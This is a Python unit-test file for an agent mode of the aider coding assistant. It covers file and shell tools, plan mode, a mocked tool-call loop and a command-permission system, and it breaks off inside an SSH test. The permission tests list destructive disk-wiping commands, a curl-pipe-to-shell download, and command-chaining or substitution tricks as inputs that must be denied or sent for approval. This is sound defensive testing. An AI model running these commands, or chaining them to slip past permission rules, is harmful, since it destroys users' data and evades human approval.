import json
import os
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from aider.agent import beceri_uret
from aider.agent.plan import ExitPlanModeTool
from aider.agent.registry import ToolContext, ToolError, ToolRegistry
from aider.agent.skills import (
    SkillLibrary,
    SkillTool,
    _parse_frontmatter,
    default_skill_roots,
)
from aider.agent.todo import TodoList, TodoWriteTool
from aider.agent.tools import (
    BashTool,
    EditTool,
    GlobTool,
    GrepTool,
    ReadTool,
    WriteTool,
)


def make_ctx(root, confirm=True):
    """Araçları çalıştırmaya yetecek kadar sahte bir coder bağlamı kur."""
    coder = MagicMock()
    coder.root = str(root)
    coder.verbose = False
    coder.abs_fnames = set()
    coder.aider_edited_files = set()
    coder.io.confirm_ask.return_value = confirm

    ctx = ToolContext(coder)
    ctx.root = str(root)
    ctx.cwd = str(root)
    ctx.todos = TodoList()
    ctx.skills = SkillLibrary([])
    return ctx


class TestReadTool(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.ctx = make_ctx(self.root)

    def tearDown(self):
        self.tmp.cleanup()

    def test_reads_with_line_numbers(self):
        (self.root / "a.txt").write_text("bir\niki\nüç\n")
        out = ReadTool().run(self.ctx, file_path="a.txt")
        self.assertIn("1\tbir", out)
        self.assertIn("3\tüç", out)

    def test_offset_and_limit(self):
        (self.root / "a.txt").write_text("\n".join(str(i) for i in range(1, 101)))
        out = ReadTool().run(self.ctx, file_path="a.txt", offset=50, limit=2)
        self.assertIn("50\t50", out)
        self.assertIn("51\t51", out)
        self.assertNotIn("52\t52", out)

    def test_missing_file_raises(self):
        with self.assertRaises(ToolError):
            ReadTool().run(self.ctx, file_path="yok.txt")

    def test_directory_raises(self):
        with self.assertRaises(ToolError):
            ReadTool().run(self.ctx, file_path=".")

    def test_kalici_baglama_eklemez(self):
        """Okunan dosya aider'ın sohbet dosyalarına eklenmemeli.

        Eskiden ekleniyordu ve bu, dosyanın tam içeriğinin bundan sonraki her
        isteğe yeniden gömülmesine yol açıyordu. Ayrıntı:
        TestBaglamaSizanDosyalar.
        """
        p = self.root / "a.txt"
        p.write_text("x")
        ReadTool().run(self.ctx, file_path="a.txt")
        self.assertNotIn(str(p.resolve()), self.ctx.coder.abs_fnames)


class TestWriteTool(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_creates_file_and_parent_dirs(self):
        ctx = make_ctx(self.root)
        out = WriteTool().run(ctx, file_path="pkg/mod.py", content="x = 1\n")
        self.assertEqual((self.root / "pkg" / "mod.py").read_text(), "x = 1\n")
        self.assertIn("Oluşturuldu", out)
        self.assertIn("pkg/mod.py", ctx.coder.aider_edited_files)

    def test_declined_write_leaves_file_untouched(self):
        ctx = make_ctx(self.root, confirm=False)
        (self.root / "a.txt").write_text("orijinal")
        out = WriteTool().run(ctx, file_path="a.txt", content="yeni")
        self.assertEqual((self.root / "a.txt").read_text(), "orijinal")
        self.assertIn("reddetti", out)


class TestEditTool(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.ctx = make_ctx(self.root)
        self.f = self.root / "a.py"

    def tearDown(self):
        self.tmp.cleanup()

    def test_single_replacement(self):
        self.f.write_text("a = 1\nb = 2\n")
        EditTool().run(self.ctx, file_path="a.py", old_string="a = 1", new_string="a = 99")
        self.assertEqual(self.f.read_text(), "a = 99\nb = 2\n")

    def test_ambiguous_match_raises(self):
        self.f.write_text("x\nx\n")
        with self.assertRaises(ToolError) as cm:
            EditTool().run(self.ctx, file_path="a.py", old_string="x", new_string="y")
        self.assertIn("2 kez", str(cm.exception))

    def test_replace_all(self):
        self.f.write_text("x\nx\n")
        out = EditTool().run(
            self.ctx, file_path="a.py", old_string="x", new_string="y", replace_all=True
        )
        self.assertEqual(self.f.read_text(), "y\ny\n")
        self.assertIn("2 yer", out)

    def test_no_match_raises(self):
        self.f.write_text("a")
        with self.assertRaises(ToolError):
            EditTool().run(self.ctx, file_path="a.py", old_string="yok", new_string="z")

    def test_identical_strings_raise(self):
        self.f.write_text("a")
        with self.assertRaises(ToolError):
            EditTool().run(self.ctx, file_path="a.py", old_string="a", new_string="a")

    def test_missing_file_raises(self):
        with self.assertRaises(ToolError):
            EditTool().run(self.ctx, file_path="yok.py", old_string="a", new_string="b")


class TestBashTool(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_runs_command(self):
        ctx = make_ctx(self.root)
        out = BashTool().run(ctx, command="echo merhaba")
        self.assertIn("merhaba", out)

    def test_nonzero_exit_is_reported(self):
        ctx = make_ctx(self.root)
        out = BashTool().run(ctx, command="exit 3")
        self.assertIn("çıkış kodu 3", out)

    def test_declined_command_does_not_run(self):
        ctx = make_ctx(self.root, confirm=False)
        out = BashTool().run(ctx, command=f"touch {self.root}/olusmamali")
        self.assertIn("reddetti", out)
        self.assertFalse((self.root / "olusmamali").exists())

    def test_timeout_is_capped(self):
        ctx = make_ctx(self.root)
        out = BashTool().run(ctx, command="echo hi", timeout=99999)
        self.assertIn("hi", out)

    def test_runs_in_context_cwd(self):
        ctx = make_ctx(self.root)
        (self.root / "isaret.txt").write_text("x")
        out = BashTool().run(ctx, command="ls")
        self.assertIn("isaret.txt", out)


class TestSearchTools(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.ctx = make_ctx(self.root)
        (self.root / "src").mkdir()
        (self.root / "src" / "a.py").write_text("def hedef():\n    pass\n")
        (self.root / "src" / "b.js").write_text("const hedef = 1;\n")
        (self.root / "node_modules").mkdir()
        (self.root / "node_modules" / "c.py").write_text("def hedef(): pass\n")

    def tearDown(self):
        self.tmp.cleanup()

    def test_glob_finds_by_extension(self):
        out = GlobTool().run(self.ctx, pattern="*.py")
        self.assertIn("a.py", out)
        self.assertNotIn("b.js", out)

    def test_glob_skips_node_modules(self):
        out = GlobTool().run(self.ctx, pattern="*.py")
        self.assertNotIn("node_modules", out)

    def test_grep_finds_content(self):
        out = GrepTool().run(self.ctx, pattern="hedef", output_mode="files_with_matches")
        self.assertIn("a.py", out)

    def test_grep_content_mode_shows_lines(self):
        out = GrepTool().run(self.ctx, pattern="def hedef", output_mode="content")
        self.assertIn("def hedef", out)

    def test_grep_no_match(self):
        out = GrepTool().run(self.ctx, pattern="kesinlikleyok12345")
        self.assertIn("eşleşme yok", out)


class TestTodoTool(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.ctx = make_ctx(Path(self.tmp.name))

    def tearDown(self):
        self.tmp.cleanup()

    def _todo(self, content, status):
        return dict(content=content, activeForm=content + "iliyor", status=status)

    def test_writes_list(self):
        TodoWriteTool().run(
            self.ctx, todos=[self._todo("Bir", "completed"), self._todo("İki", "in_progress")]
        )
        self.assertEqual(len(self.ctx.todos.items), 2)
        self.assertIn("[x] Bir", self.ctx.todos.render())

    def test_rejects_two_in_progress(self):
        with self.assertRaises(ToolError):
            TodoWriteTool().run(
                self.ctx,
                todos=[self._todo("Bir", "in_progress"), self._todo("İki", "in_progress")],
            )

    def test_rejects_bad_status(self):
        with self.assertRaises(ToolError):
            TodoWriteTool().run(self.ctx, todos=[self._todo("Bir", "yapildi")])

    def test_summary(self):
        TodoWriteTool().run(
            self.ctx, todos=[self._todo("Bir", "completed"), self._todo("İki", "pending")]
        )
        self.assertEqual(self.ctx.todos.summary(), "1/2 tamamlandı")


class TestSkills(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.skills_dir = self.root / ".aider" / "skills"
        self.skills_dir.mkdir(parents=True)

    def tearDown(self):
        self.tmp.cleanup()

    def _make_skill(self, name, desc, body="Adım 1: bir şey yap."):
        d = self.skills_dir / name
        d.mkdir()
        (d / "SKILL.md").write_text(f"---\nname: {name}\ndescription: {desc}\n---\n\n{body}\n")

    def test_frontmatter_parsing(self):
        meta, body = _parse_frontmatter("---\nname: x\ndescription: y\n---\n\ngövde\n")
        self.assertEqual(meta["name"], "x")
        self.assertEqual(meta["description"], "y")
        self.assertEqual(body.strip(), "gövde")

    def test_frontmatter_absent(self):
        meta, body = _parse_frontmatter("gövde")
        self.assertEqual(meta, {})
        self.assertEqual(body, "gövde")

    def test_discovery(self):
        self._make_skill("deploy", "Deploy adımları")
        lib = SkillLibrary([self.skills_dir])
        self.assertIn("deploy", lib.skills)
        self.assertIn("deploy: Deploy adımları", lib.catalog())

    def test_skill_without_description_is_skipped(self):
        d = self.skills_dir / "bos"
        d.mkdir()
        (d / "SKILL.md").write_text("---\nname: bos\n---\n\ngövde\n")
        lib = SkillLibrary([self.skills_dir])
        self.assertNotIn("bos", lib.skills)

    def test_skill_tool_returns_body(self):
        self._make_skill("deploy", "Deploy adımları", body="ÖZEL GÖVDE")
        ctx = make_ctx(self.root)
        ctx.skills = SkillLibrary([self.skills_dir])
        out = SkillTool().run(ctx, skill="deploy")
        self.assertIn("ÖZEL GÖVDE", out)

    def test_unknown_skill_raises(self):
        self._make_skill("deploy", "Deploy adımları")
        ctx = make_ctx(self.root)
        ctx.skills = SkillLibrary([self.skills_dir])
        with self.assertRaises(ToolError):
            SkillTool().run(ctx, skill="yok")

    def test_first_root_wins(self):
        other = self.root / "diger"
        (other / "deploy").mkdir(parents=True)
        (other / "deploy" / "SKILL.md").write_text(
            "---\nname: deploy\ndescription: ikincil\n---\n\nB\n"
        )
        self._make_skill("deploy", "birincil", body="A")
        lib = SkillLibrary([self.skills_dir, other])
        self.assertEqual(lib.get("deploy").description, "birincil")


class TestRegistry(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.ctx = make_ctx(Path(self.tmp.name))
        self.reg = ToolRegistry([ReadTool(), WriteTool(), BashTool()])

    def tearDown(self):
        self.tmp.cleanup()

    def test_schemas_are_openai_shaped(self):
        for schema in self.reg.schemas():
            self.assertEqual(schema["type"], "function")
            fn = schema["function"]
            self.assertTrue(fn["name"])
            self.assertTrue(fn["description"])
            self.assertEqual(fn["parameters"]["type"], "object")

    def test_schemas_respect_enabled_filter(self):
        names = [s["function"]["name"] for s in self.reg.schemas(enabled=["Read"])]
        self.assertEqual(names, ["Read"])

    def test_unknown_tool_returns_error_string(self):
        out = self.reg.run("Yok", {}, self.ctx)
        self.assertIn("diye bir araç yok", out)

    def test_tool_error_becomes_string(self):
        out = self.reg.run("Read", dict(file_path="yok.txt"), self.ctx)
        self.assertTrue(out.startswith("Hata:"))

    def test_bad_arguments_become_string(self):
        out = self.reg.run("Read", dict(bilinmeyen=1), self.ctx)
        self.assertTrue(out.startswith("Hata:"))

    def test_non_dict_args_rejected(self):
        out = self.reg.run("Read", ["a"], self.ctx)
        self.assertIn("JSON nesnesi olmalı", out)


class TestPlanMode(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.ctx = make_ctx(Path(self.tmp.name))
        self.ctx.plan_mode = True

    def tearDown(self):
        self.tmp.cleanup()

    def test_approval_exits_plan_mode(self):
        self.ctx.io.confirm_ask.return_value = True
        out = ExitPlanModeTool().run(self.ctx, plan="1. Şunu yap")
        self.assertFalse(self.ctx.plan_mode)
        self.assertIn("onayladı", out)

    def test_rejection_stays_in_plan_mode(self):
        self.ctx.io.confirm_ask.return_value = False
        out = ExitPlanModeTool().run(self.ctx, plan="1. Şunu yap")
        self.assertTrue(self.ctx.plan_mode)
        self.assertIn("onaylamadı", out)


class TestSendCompletionToolShapes(unittest.TestCase):
    """models.send_completion'ın iki tool biçimini de doğru kurduğunu doğrula."""

    def _kwargs_for(self, functions):
        from aider.models import Model

        model = Model("gpt-4o")
        captured = {}

        def fake_completion(**kwargs):
            captured.update(kwargs)
            return MagicMock()

        # litellm'i tembel yükleyici üzerinden elle yamalamak kalıcı iz bırakıyor
        # ve sonraki testleri bozuyor; patch bağlamı doğru şekilde geri alıyor.
        with patch("litellm.completion", side_effect=fake_completion):
            model.send_completion([{"role": "user", "content": "hi"}], functions, False)
        return captured

    def test_agentic_tools_use_auto_choice(self):
        tools = [
            dict(type="function", function=dict(name="Read", description="d", parameters={})),
            dict(type="function", function=dict(name="Bash", description="d", parameters={})),
        ]
        kwargs = self._kwargs_for(tools)
        self.assertEqual(kwargs["tool_choice"], "auto")
        self.assertEqual(len(kwargs["tools"]), 2)

    def test_legacy_single_function_is_forced(self):
        kwargs = self._kwargs_for([dict(name="write_file", description="d", parameters={})])
        self.assertEqual(kwargs["tool_choice"]["function"]["name"], "write_file")
        self.assertEqual(len(kwargs["tools"]), 1)


if __name__ == "__main__":
    unittest.main()


class FakeFunction:
    def __init__(self, name, arguments):
        self.name = name
        self.arguments = arguments


class FakeToolCall:
    def __init__(self, id, name, arguments):
        self.id = id
        self.type = "function"
        self.function = FakeFunction(name, arguments)


class FakeMessage:
    def __init__(self, content=None, tool_calls=None):
        self.content = content
        self.tool_calls = tool_calls


class FakeChoice:
    def __init__(self, message):
        self.message = message
        self.finish_reason = "stop"


class FakeCompletion:
    def __init__(self, message):
        self.choices = [FakeChoice(message)]


class TestAgentLoop(unittest.TestCase):
    """AgentCoder'ın araç döngüsünü sahte bir modelle uçtan uca sür."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.prev_cwd = os.getcwd()
        os.chdir(self.root)

    def tearDown(self):
        os.chdir(self.prev_cwd)
        self.tmp.cleanup()

    def _coder(self, responses, plan_mode=False):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        io = InputOutput(yes=True, pretty=False, fancy_input=False)
        coder = Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=io,
            fnames=[],
            use_git=False,
            stream=False,
            plan_mode=plan_mode,
        )
        coder.auto_lint = False
        coder.auto_test = False

        self.sent = []

        def fake_send_completion(messages, functions, stream, temperature=None):
            self.sent.append((list(messages), functions))
            return MagicMock(), FakeCompletion(responses[len(self.sent) - 1])

        coder.main_model.send_completion = fake_send_completion
        return coder

    def test_single_text_reply_ends_loop(self):
        coder = self._coder([FakeMessage(content="merhaba")])
        list(coder.send_message("selam"))
        self.assertEqual(len(self.sent), 1)
        self.assertEqual(coder.cur_messages[-1]["content"], "merhaba")

    def test_tool_call_is_executed_and_fed_back(self):
        (self.root / "veri.txt").write_text("GİZLİ_DEĞER\n")
        coder = self._coder(
            [
                FakeMessage(
                    tool_calls=[FakeToolCall("c1", "Read", json.dumps({"file_path": "veri.txt"}))]
                ),
                FakeMessage(content="Dosyayı okudum."),
            ]
        )
        list(coder.send_message("veri.txt içinde ne var?"))

        self.assertEqual(len(self.sent), 2)
        # İkinci istekte araç sonucu modele geri beslenmiş olmalı.
        second_request = self.sent[1][0]
        tool_msgs = [m for m in second_request if m.get("role") == "tool"]
        self.assertEqual(len(tool_msgs), 1)
        self.assertEqual(tool_msgs[0]["tool_call_id"], "c1")
        self.assertIn("GİZLİ_DEĞER", tool_msgs[0]["content"])

    def test_multiple_tool_calls_in_one_turn(self):
        (self.root / "a.txt").write_text("AAA")
        (self.root / "b.txt").write_text("BBB")
        coder = self._coder(
            [
                FakeMessage(
                    tool_calls=[
                        FakeToolCall("c1", "Read", json.dumps({"file_path": "a.txt"})),
                        FakeToolCall("c2", "Read", json.dumps({"file_path": "b.txt"})),
                    ]
                ),
                FakeMessage(content="İkisini de okudum."),
            ]
        )
        list(coder.send_message("iki dosyayı oku"))

        tool_msgs = [m for m in self.sent[1][0] if m.get("role") == "tool"]
        self.assertEqual(len(tool_msgs), 2)
        self.assertIn("AAA", tool_msgs[0]["content"])
        self.assertIn("BBB", tool_msgs[1]["content"])

    def test_write_tool_edits_disk_and_is_tracked(self):
        coder = self._coder(
            [
                FakeMessage(
                    tool_calls=[
                        FakeToolCall(
                            "c1",
                            "Write",
                            json.dumps({"file_path": "yeni.py", "content": "x = 1\n"}),
                        )
                    ]
                ),
                FakeMessage(content="Yazdım."),
            ]
        )
        list(coder.send_message("yeni.py oluştur"))
        self.assertEqual((self.root / "yeni.py").read_text(), "x = 1\n")
        self.assertIn("yeni.py", coder.aider_edited_files)

    def test_malformed_tool_arguments_are_reported_not_raised(self):
        coder = self._coder(
            [
                FakeMessage(tool_calls=[FakeToolCall("c1", "Read", "{bozuk json")]),
                FakeMessage(content="Tamam."),
            ]
        )
        list(coder.send_message("oku"))
        tool_msgs = [m for m in self.sent[1][0] if m.get("role") == "tool"]
        self.assertIn("geçerli JSON değil", tool_msgs[0]["content"])

    def test_unknown_tool_is_reported_not_raised(self):
        coder = self._coder(
            [
                FakeMessage(tool_calls=[FakeToolCall("c1", "UcanKedi", "{}")]),
                FakeMessage(content="Tamam."),
            ]
        )
        list(coder.send_message("uç"))
        tool_msgs = [m for m in self.sent[1][0] if m.get("role") == "tool"]
        self.assertIn("diye bir araç yok", tool_msgs[0]["content"])

    def test_iteration_cap_stops_runaway_loop(self):
        # Model sonsuza dek araç çağırırsa döngü sınırda durmalı.
        responses = [
            FakeMessage(tool_calls=[FakeToolCall(f"c{i}", "Glob", json.dumps({"pattern": "*"}))])
            for i in range(20)
        ]
        coder = self._coder(responses)
        coder.max_iterations = 3
        list(coder.send_message("dön dur"))
        self.assertEqual(len(self.sent), 3)

    def test_plan_mode_blocks_mutating_tools(self):
        coder = self._coder(
            [
                FakeMessage(
                    tool_calls=[
                        FakeToolCall(
                            "c1", "Write", json.dumps({"file_path": "x.py", "content": "x"})
                        )
                    ]
                ),
                FakeMessage(content="Anladım."),
            ],
            plan_mode=True,
        )
        list(coder.send_message("x.py yaz"))
        self.assertFalse((self.root / "x.py").exists())
        tool_msgs = [m for m in self.sent[1][0] if m.get("role") == "tool"]
        self.assertIn("plan modunda", tool_msgs[0]["content"])

    def test_plan_mode_hides_mutating_tools_from_schema(self):
        coder = self._coder([FakeMessage(content="ok")], plan_mode=True)
        list(coder.send_message("merhaba"))
        offered = {t["function"]["name"] for t in self.sent[0][1]}
        self.assertNotIn("Write", offered)
        self.assertNotIn("Bash", offered)
        self.assertIn("Read", offered)
        self.assertIn("ExitPlanMode", offered)

    def test_normal_mode_offers_mutating_tools(self):
        coder = self._coder([FakeMessage(content="ok")])
        list(coder.send_message("merhaba"))
        offered = {t["function"]["name"] for t in self.sent[0][1]}
        self.assertIn("Write", offered)
        self.assertIn("Bash", offered)
        self.assertNotIn("ExitPlanMode", offered)


# ---------------------------------------------------------------------------
# İzin sistemi
# ---------------------------------------------------------------------------

from aider.agent.permissions import (  # noqa: E402
    ALLOW,
    ASK,
    DENY,
    MODE_ASK,
    MODE_AUTO,
    PermissionSet,
    Rule,
    _match_path,
    split_command,
    suggest_rule,
)


class TestPermissionRules(unittest.TestCase):
    def test_bare_tool_rule_matches_any_call(self):
        r = Rule("Read")
        self.assertTrue(r.matches("Read", {"file_path": "x"}))
        self.assertFalse(r.matches("Write", {"file_path": "x"}))

    def test_prefix_rule_respects_word_boundary(self):
        r = Rule("Bash(git diff:*)")
        self.assertTrue(r.matches("Bash", {"command": "git diff"}))
        self.assertTrue(r.matches("Bash", {"command": "git diff --stat"}))
        # "git diff-tree" ayrı bir komuttur, kural onu kapsamamalı.
        self.assertFalse(r.matches("Bash", {"command": "git diff-tree HEAD"}))

    def test_exact_rule(self):
        r = Rule("Bash(npm test)")
        self.assertTrue(r.matches("Bash", {"command": "npm test"}))
        self.assertFalse(r.matches("Bash", {"command": "npm test -- --watch"}))

    def test_path_glob_rules(self):
        r = Rule("Write(src/**)")
        self.assertTrue(r.matches("Write", {"file_path": "src/a.py"}))
        self.assertTrue(r.matches("Write", {"file_path": "src/deep/b.py"}))
        self.assertFalse(r.matches("Write", {"file_path": "tests/a.py"}))

    def test_invalid_rule_raises(self):
        for bad in ["Bash(", "(x)", "", "Bash(x"]:
            with self.assertRaises(ValueError):
                Rule(bad)

    def test_split_command(self):
        self.assertEqual(split_command("a && b ; c | d"), ["a", "b", "c", "d"])
        self.assertEqual(split_command("git diff"), ["git diff"])


class TestPermissionDecisions(unittest.TestCase):
    def test_readonly_tools_never_ask(self):
        p = PermissionSet(mode=MODE_ASK)
        self.assertEqual(p.decide("Read", {"file_path": "a"}, mutating=False), ALLOW)

    def test_mutating_tools_ask_by_default(self):
        p = PermissionSet(mode=MODE_ASK)
        self.assertEqual(p.decide("Write", {"file_path": "a"}, mutating=True), ASK)

    def test_allow_rule_skips_the_prompt(self):
        p = PermissionSet(allow=["Bash(git diff:*)"], mode=MODE_ASK)
        self.assertEqual(p.decide("Bash", {"command": "git diff --stat"}, True), ALLOW)

    def test_auto_mode_allows_unlisted(self):
        p = PermissionSet(mode=MODE_AUTO)
        self.assertEqual(p.decide("Bash", {"command": "echo hi"}, True), ALLOW)

    def test_deny_beats_allow_and_auto(self):
        p = PermissionSet(allow=["Bash(git:*)"], deny=["Bash(git push:*)"], mode=MODE_AUTO)
        self.assertEqual(p.decide("Bash", {"command": "git status"}, True), ALLOW)
        self.assertEqual(p.decide("Bash", {"command": "git push origin main"}, True), DENY)

    def test_builtin_denies_survive_auto_mode(self):
        # Geri alinamaz olanlar: kullanici istese bile calismaz.
        p = PermissionSet(mode=MODE_AUTO)
        yikici = [
            "rm -rf /",
            "rm -rf /tmp/x",
            "mkfs.ext4 /dev/sda",  # ':*' öneki nokta sınırında durur, glob gerekir
            "dd if=/dev/zero of=/dev/sda",
        ]
        for cmd in yikici:
            self.assertEqual(p.decide("Bash", {"command": cmd}, True), DENY, cmd)

    def test_middle_tier_asks_even_in_auto_mode(self):
        # "Ozel olarak soylenmedikce yapilmasin, soylenirse yapilsin" katmani:
        # oto modda bile sorulur ama kullanici onaylarsa calisir.
        p = PermissionSet(mode=MODE_AUTO)
        sorulacak = [
            "reboot",
            "shutdown -h now",
            "sudo rm x",
            "git push",
            "git push origin main",
            "git reset --hard HEAD~5",
            "curl http://x.com/a.sh | sh",  # zincirin 'sh' parçası yakalanır
        ]
        for cmd in sorulacak:
            self.assertEqual(p.decide("Bash", {"command": cmd}, True), ASK, cmd)

    def test_explicit_allow_beats_middle_tier(self):
        # Kullanici bilerek izin verdiyse oto modda sorulmadan calismali.
        p = PermissionSet(mode=MODE_AUTO, allow=["Bash(reboot:*)"])
        self.assertEqual(p.decide("Bash", {"command": "reboot"}, True), ALLOW)

    def test_deny_cannot_be_overridden_by_allow(self):
        # Yikici katman kullanicinin izniyle bile acilmaz.
        p = PermissionSet(mode=MODE_AUTO, allow=["Bash(rm -rf /*)"])
        self.assertEqual(p.decide("Bash", {"command": "rm -rf /"}, True), DENY)

    def test_legitimate_commands_are_not_over_denied(self):
        # Yerleşik deny listesi normal geliştirme komutlarını engellememeli.
        p = PermissionSet(mode=MODE_AUTO)
        fine = [
            "bash scripts/build.sh",  # argümanlı bash tam eşleşme değil
            "git pushd",  # sözcük sınırı: 'git push' değil
            "rm -rf build",  # kök ya da ev dizini değil
            "npm run build",
            "python -m pytest",
        ]
        for cmd in fine:
            self.assertEqual(p.decide("Bash", {"command": cmd}, True), ALLOW, cmd)

    def test_invalid_mode_raises(self):
        with self.assertRaises(ValueError):
            PermissionSet(mode="belirsiz")

    def test_session_allow_rule_takes_effect(self):
        p = PermissionSet(mode=MODE_ASK)
        self.assertEqual(p.decide("Bash", {"command": "ls -la"}, True), ASK)
        p.add_session_allow("Bash(ls:*)")
        self.assertEqual(p.decide("Bash", {"command": "ls -la"}, True), ALLOW)


class TestPermissionEscapes(unittest.TestCase):
    """Bir izin kuralının yetkisiz komut kaçırmadığını doğrula."""

    def setUp(self):
        self.p = PermissionSet(allow=["Bash(git diff:*)"], mode=MODE_ASK)

    def test_chained_unauthorized_command_is_not_allowed(self):
        self.assertEqual(self.p.decide("Bash", {"command": "git diff && npm publish"}, True), ASK)

    def test_semicolon_chain_is_not_allowed(self):
        self.assertEqual(self.p.decide("Bash", {"command": "git diff; npm publish"}, True), ASK)

    def test_pipe_to_shell_is_never_auto_approved(self):
        # Kabuğa boru ile veri geçirmek orta katmana takılır: oto modda bile
        # sorulur, sessizce çalışmaz.
        self.assertEqual(self.p.decide("Bash", {"command": "git diff | sh"}, True), ASK)
        auto = PermissionSet(allow=["Bash(git diff:*)"], mode=MODE_AUTO)
        self.assertEqual(auto.decide("Bash", {"command": "git diff | sh"}, True), ASK)

    def test_pipe_to_unauthorized_command_asks(self):
        self.assertEqual(self.p.decide("Bash", {"command": "git diff | npm publish"}, True), ASK)

    def test_fully_authorized_chain_is_allowed(self):
        self.assertEqual(
            self.p.decide("Bash", {"command": "git diff && git diff --stat"}, True), ALLOW
        )

    def test_command_substitution_is_never_auto_allowed(self):
        for cmd in ["git diff $(rm -rf /tmp/x)", "git diff `whoami`", "git diff <(evil)"]:
            self.assertEqual(self.p.decide("Bash", {"command": cmd}, True), ASK, cmd)

    def test_denied_part_in_chain_denies_whole(self):
        p = PermissionSet(allow=["Bash(git:*)"], deny=["Bash(git push:*)"], mode=MODE_AUTO)
        self.assertEqual(p.decide("Bash", {"command": "git status && git push"}, True), DENY)


class TestSuggestRule(unittest.TestCase):
    def test_two_word_command(self):
        self.assertEqual(suggest_rule("Bash", {"command": "git diff --stat"}), "Bash(git diff:*)")

    def test_command_with_flag(self):
        self.assertEqual(suggest_rule("Bash", {"command": "ls -la"}), "Bash(ls:*)")

    def test_non_bash_tool(self):
        self.assertEqual(suggest_rule("Write", {"file_path": "a.py"}), "Write")

    def test_ssh_kurali_komuta_ve_sunucuya_daralir(self):
        """Uzak komutta "bir daha sorma" her sunucuyu açmamalı.

        Çıplak "Ssh" kuralı her hostta her komutu onaysız hâle getiriyordu:
        tek bir "df -h" onayı, tanımlı bütün sunucularda "rm -rf" demekti.
        """
        kural = suggest_rule("Ssh", {"host": "skyup", "command": "yum check-update"})
        self.assertEqual(kural, "Ssh(skyup::yum check-update:*)")

    def test_ssh_kurali_baska_komutu_kapsamaz(self):
        kural = Rule(suggest_rule("Ssh", {"host": "skyup", "command": "df -h"}))
        self.assertTrue(kural.matches("Ssh", {"host": "skyup", "command": "df -h /var"}))
        self.assertFalse(kural.matches("Ssh", {"host": "skyup", "command": "rm -rf /var"}))

    def test_ssh_kurali_baska_sunucuyu_kapsamaz(self):
        # Asıl kazanç bu: test sunucusunda onayladığın komut üretimde
        # onaysız kalmamalı.
        kural = Rule(suggest_rule("Ssh", {"host": "skyup", "command": "df -h"}))
        self.assertTrue(kural.matches("Ssh", {"host": "skyup", "command": "df -h"}))
        self.assertFalse(kural.matches("Ssh", {"host": "uretim01", "command": "df -h"}))

    def test_sunucu_kapsamli_kural_yerel_bashi_kapsamaz(self):
        kural = Rule("Ssh(skyup::rm -rf /tmp)")
        self.assertFalse(kural.matches("Bash", {"command": "rm -rf /tmp"}))


class TestNoktaliYolEslesmesi(unittest.TestCase):
    """Nokta ile başlayan yollar kurallara yakalanmalı.

    _match_path içindeki lstrip("./") karakter siliyordu, önek değil: ".env"
    yolu "env" oluyor ve Edit(.env) gibi bir reddetme kuralı sessizce
    ıskalıyordu.
    """

    def test_gizli_dosya_kuralla_eslesir(self):
        self.assertTrue(_match_path(".env", ".env"))
        self.assertTrue(_match_path(".env*", ".env.local"))

    def test_gizli_dosya_reddi_calisir(self):
        perms = PermissionSet(deny=["Edit(.env)"], mode=MODE_AUTO)
        self.assertEqual(perms.decide("Edit", {"file_path": ".env"}, mutating=True), DENY)

    def test_nokta_egik_oneki_soyulur(self):
        self.assertTrue(_match_path("src/**", "./src/a/b.py"))

    def test_ilgisiz_yol_eslesmez(self):
        self.assertFalse(_match_path(".env", "env"))


class TestBaglamaSizanDosyalar(unittest.TestCase):
    """Araçlar okudukları dosyayı kalıcı sohbet bağlamına eklememeli.

    Eklendiğinde aider dosyanın TAM içeriğini bundan sonraki her isteğe
    yeniden gömüyor (base_coder.get_chat_files_messages). Model birkaç dosya
    okuyunca bağlam yalnızca dosya tekrarlarıyla doluyor ve pencere bitiyor.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        (self.root / "a.py").write_text("print(1)\n")
        (self.root / "b.py").write_text("print(2)\n")
        self.ctx = make_ctx(self.root)

    def tearDown(self):
        self.tmp.cleanup()

    def test_read_kalici_baglama_eklemez(self):
        ReadTool().run(self.ctx, file_path="a.py")
        ReadTool().run(self.ctx, file_path="b.py")
        self.assertEqual(self.ctx.coder.abs_fnames, set())

    def test_write_kalici_baglama_eklemez(self):
        WriteTool().run(self.ctx, file_path="c.py", content="print(3)\n")
        self.assertEqual(self.ctx.coder.abs_fnames, set())
        # Commit ve lint için gereken kayıt yerinde kalmalı.
        self.assertIn("c.py", self.ctx.coder.aider_edited_files)

    def test_edit_kalici_baglama_eklemez(self):
        EditTool().run(self.ctx, file_path="a.py", old_string="1", new_string="9")
        self.assertEqual(self.ctx.coder.abs_fnames, set())
        self.assertIn("a.py", self.ctx.coder.aider_edited_files)


class TestSshUsesBashDenyRules(unittest.TestCase):
    """Uzak kabuk yerel yasakları atlamamalı.

    Bulundugu hâliyle Bash(rm -rf /*) reddi yalnizca yerel Bash'e uygulaniyordu;
    ayni komut Ssh ile gonderilince oto modda ALLOW donuyordu. Yani "rm -rf /"
    yasagi sunucularda hicbir sey ifade etmiyordu.
    """

    def setUp(self):
        self.auto = PermissionSet(mode=MODE_AUTO)

    def _ssh(self, command):
        return self.auto.decide("Ssh", {"host": "sunucu", "command": command}, True)

    def test_default_denies_apply_to_remote_commands(self):
